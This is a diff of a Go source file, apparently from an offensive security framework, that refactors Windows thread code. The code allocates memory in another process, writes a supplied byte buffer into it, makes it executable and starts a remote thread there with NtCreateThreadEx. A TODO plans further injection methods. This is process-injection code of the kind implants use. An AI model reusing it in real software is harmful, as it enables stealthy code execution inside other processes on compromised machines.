@@ -5,44 +5,28 @@ package cmd
 
 import (
 	"context"
-	"strconv"
 	"sync/atomic"
 	"time"
-	"unsafe"
 
-	"github.com/iDigitalFlame/xmt/util/xerr"
-	"golang.org/x/sys/windows"
+	"github.com/iDigitalFlame/xmt/cmd/filter"
+	"github.com/iDigitalFlame/xmt/device/winapi"
 )
 
-const secThread = windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION |
-	windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE |
-	windows.PROCESS_VM_READ | windows.PROCESS_TERMINATE |
-	windows.PROCESS_DUP_HANDLE | 0x001
-
-var (
-	dllNtdll = windows.NewLazySystemDLL("ntdll.dll")
-
-	funcSuspendThread     = dllKernel32.NewProc("SuspendThread")
-	funcTerminateThread   = dllKernel32.NewProc("TerminateThread")
-	funcGetExitCodeThread = dllKernel32.NewProc("GetExitCodeThread")
-
-	funcNtCreateThreadEx        = dllNtdll.NewProc("NtCreateThreadEx")
-	funcNtFreeVirtualMemory     = dllNtdll.NewProc("NtFreeVirtualMemory")
-	funcNtWriteVirtualMemory    = dllNtdll.NewProc("NtWriteVirtualMemory")
-	funcNtProtectVirtualMemory  = dllNtdll.NewProc("NtProtectVirtualMemory")
-	funcNtAllocateVirtualMemory = dllNtdll.NewProc("NtAllocateVirtualMemory")
-)
+//windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION |
+//	windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE |
+//	windows.PROCESS_VM_READ | windows.PROCESS_TERMINATE |
+//	windows.PROCESS_DUP_HANDLE | 0x001
 
 type thread struct {
 	ctx              context.Context
 	err              error
-	cb               func()
-	ch               chan finished
+	callback         func()
+	ch               chan struct{}
 	cancel           context.CancelFunc
-	filter           *Filter
-	hwnd, loc, owner windows.Handle
+	filter           *filter.Filter
+	hwnd, loc, owner uintptr
 	exit, cookie     uint32
-	s                bool
+	suspended        bool
 }
 
 func (t *thread) wait() {
@@ -66,9 +50,8 @@ func (t *thread) wait() {
 		t.stopWith(exitStopped, err2)
 		return
 	}
-	var r uintptr
-	r, _, err = funcGetExitCodeThread.Call(uintptr(t.hwnd), uintptr(unsafe.Pointer(&t.exit)))
-	if atomic.StoreUint32(&t.cookie, 2); r == 0 {
+	err = winapi.GetExitCodeThread(t.hwnd, &t.exit)
+	if atomic.StoreUint32(&t.cookie, 2); err != nil {
 		t.stopWith(exitStopped, err)
 		return
 	}
@@ -83,13 +66,13 @@ func (t *thread) close() {
 		return
 	}
 	if t.loc > 0 {
-		freeMemory(t.owner, t.loc)
+		winapi.NtFreeVirtualMemory(t.owner, t.loc)
 	}
-	if t.cb != nil {
-		t.cb()
+	if t.callback != nil {
+		t.callback()
 	}
-	windows.CloseHandle(t.hwnd)
-	windows.CloseHandle(t.owner)
+	winapi.CloseHandle(t.hwnd)
+	winapi.CloseHandle(t.owner)
 	t.hwnd, t.owner, t.loc = 0, 0, 0
 }
 func (t *thread) kill() error {
@@ -97,16 +80,13 @@ func (t *thread) kill() error {
 		return t.err
 	}
 	t.exit = exitStopped
-	if r, _, err := funcTerminateThread.Call(uintptr(t.hwnd), uintptr(exitStopped)); r == 0 {
-		return err
-	}
-	return nil
+	return winapi.TerminateThread(t.hwnd, exitStopped)
 }
 func (t *thread) Pid() uint32 {
 	if !t.Running() {
 		return 0
 	}
-	p, _ := windows.GetProcessId(t.owner)
+	p, _ := winapi.GetProcessID(t.owner)
 	return p
 }
 func (t *thread) Wait() error {
@@ -137,40 +117,29 @@ func (t *thread) Resume() error {
 	if !t.Running() || t.hwnd == 0 {
 		return ErrNotStarted
 	}
-	_, err := windows.ResumeThread(t.hwnd)
+	_, err := winapi.ResumeThread(t.hwnd)
 	return err
 }
-func (t *thread) String() string {
-	if t.hwnd == 0 {
-		return ""
+func (t *thread) Release() error {
+	if atomic.LoadUintptr(&t.hwnd) == 0 {
+		return nil
 	}
-	return "(" + strconv.FormatUint(uint64(t.hwnd), 16) + ") 0x" +
-		strconv.FormatUint(uint64(t.owner), 16) + " -> 0x" + strconv.FormatUint(uint64(t.loc), 16)
+	winapi.CloseHandle(t.hwnd)
+	winapi.CloseHandle(t.owner)
+	atomic.StoreUint32(&t.cookie, 2)
+	return t.stopWith(0, nil)
 }
 func (t *thread) Suspend() error {
 	if !t.Running() || t.hwnd == 0 {
 		return ErrNotStarted
 	}
-	if r, _, err := funcSuspendThread.Call(uintptr(t.hwnd)); r != 0 {
-		return err
-	}
-	return nil
+	return winapi.SuspendThread(t.hwnd)
 }
 func (t *thread) SetSuspended(s bool) {
-	t.s = s
+	t.suspended = s
 }
-func freeMemory(h, a windows.Handle) error {
-	var (
-		s         uint32
-		r, _, err = funcNtFreeVirtualMemory.Call(
-			uintptr(h), uintptr(unsafe.Pointer(&a)),
-			uintptr(unsafe.Pointer(&s)), windows.MEM_RELEASE,
-		)
-	)
-	if r > 0 {
-		return xerr.Wrap("NtFreeVirtualMemory", err)
-	}
-	return nil
+func (t *thread) Done() <-chan struct{} {
+	return t.ch
 }
 func (t *thread) Handle() (uintptr, error) {
 	if t.hwnd == 0 {
@@ -214,76 +183,7 @@ func (t *thread) stopWith(c uint32, e error) error {
 	}
 	return t.err
 }
-func writeMemory(h, a windows.Handle, b []byte) (uint32, error) {
-	var (
-		s         uint32
-		r, _, err = funcNtWriteVirtualMemory.Call(
-			uintptr(h), uintptr(a),
-			uintptr(unsafe.Pointer(&b[0])),
-			uintptr(len(b)),
-			uintptr(unsafe.Pointer(&s)),
-		)
-	)
-	if r > 0 {
-		return 0, xerr.Wrap("NtWriteVirtualMemory", err)
-	}
-	return s, nil
-}
-func protectMemory(h, a windows.Handle, s, p uint32) (uint32, error) {
-	if !protectEnable {
-		return 0, nil
-	}
-	var (
-		x, v      uint32 = s, 0
-		r, _, err        = funcNtProtectVirtualMemory.Call(
-			uintptr(h), uintptr(unsafe.Pointer(&a)),
-			uintptr(unsafe.Pointer(&x)), uintptr(p),
-			uintptr(unsafe.Pointer(&v)),
-		)
-	)
-	if r > 0 {
-		return 0, xerr.Wrap("NtProtectVirtualMemory", err)
-	}
-	return v, nil
-}
-func createThread(h, a, p windows.Handle, s bool) (windows.Handle, error) {
-	// TODO(dij): Add additional injection types
-	//            - NtQueueApcThread
-	//            - Kernel Table Callback
-	f := uintptr(0x0004)
-	if s {
-		f |= 0x0001
-	}
-	var (
-		t         windows.Handle
-		r, _, err = funcNtCreateThreadEx.Call(
-			uintptr(unsafe.Pointer(&t)),
-			windows.GENERIC_ALL, 0,
-			uintptr(h), uintptr(a), uintptr(p),
-			f, 0, 0, 0, 0,
-		)
-	)
-	if r > 0 {
-		return 0, xerr.Wrap("NtCreateThreadEx", err)
-	}
-	return t, nil
-}
-func allocateMemory(h windows.Handle, s, p uint32) (windows.Handle, error) {
-	var (
-		a         windows.Handle
-		x         = s
-		r, _, err = funcNtAllocateVirtualMemory.Call(
-			uintptr(h), uintptr(unsafe.Pointer(&a)),
-			0, uintptr(unsafe.Pointer(&x)),
-			windows.MEM_COMMIT, uintptr(p),
-		)
-	)
-	if r > 0 {
-		return 0, xerr.Wrap("NtAllocateVirtualMemory", err)
-	}
-	return a, nil
-}
-func (t *thread) Start(p windows.Handle, d time.Duration, a windows.Handle, b []byte) error {
+func (t *thread) Start(p uintptr, d time.Duration, a uintptr, b []byte) error {
 	if t.Running() {
 		return ErrAlreadyStarted
 	}
@@ -299,30 +199,34 @@ func (t *thread) Start(p windows.Handle, d time.Duration, a windows.Handle, b []
 		t.cancel = func() {}
 	}
 	atomic.StoreUint32(&t.cookie, 0)
-	if t.ch, t.owner = make(chan finished), p; t.owner == 0 {
-		t.owner = windows.CurrentProcess()
+	if t.ch, t.owner = make(chan struct{}), p; t.owner == 0 {
+		t.owner = winapi.CurrentProcess
 	}
 	var err error
 	if t.filter != nil && p == 0 {
-		if t.owner, err = t.filter.get(secThread, nil); err != nil {
+		if t.owner, err = t.filter.HandleFunc(0x47B, nil); err != nil {
 			return t.stopWith(exitStopped, err)
 		}
 	}
 	l := uint32(len(b))
-	if t.loc, err = allocateMemory(t.owner, l, windows.PAGE_READWRITE); err != nil {
+	if t.loc, err = winapi.NtAllocateVirtualMemory(t.owner, l, 0x4); err != nil {
 		return t.stopWith(exitStopped, err)
 	}
-	if _, err = writeMemory(t.owner, t.loc, b); err != nil {
+	if _, err = winapi.NtWriteVirtualMemory(t.owner, t.loc, b); err != nil {
 		return t.stopWith(exitStopped, err)
 	}
 	if a > 0 {
-		protectMemory(t.owner, t.loc, l, windows.PAGE_READONLY)
-		if t.hwnd, err = createThread(t.owner, a, t.loc, t.s); err != nil {
+		if protectEnable {
+			winapi.NtProtectVirtualMemory(t.owner, t.loc, l, 0x2)
+		}
+		if t.hwnd, err = winapi.NtCreateThreadEx(t.owner, a, t.loc, t.suspended); err != nil {
 			return t.stopWith(exitStopped, err)
 		}
 	} else {
-		protectMemory(t.owner, t.loc, l, windows.PAGE_EXECUTE_READ)
-		if t.hwnd, err = createThread(t.owner, t.loc, 0, t.s); err != nil {
+		if protectEnable {
+			winapi.NtProtectVirtualMemory(t.owner, t.loc, l, 0x20)
+		}
+		if t.hwnd, err = winapi.NtCreateThreadEx(t.owner, t.loc, 0, t.suspended); err != nil {
 			return t.stopWith(exitStopped, err)
 		}
 	}
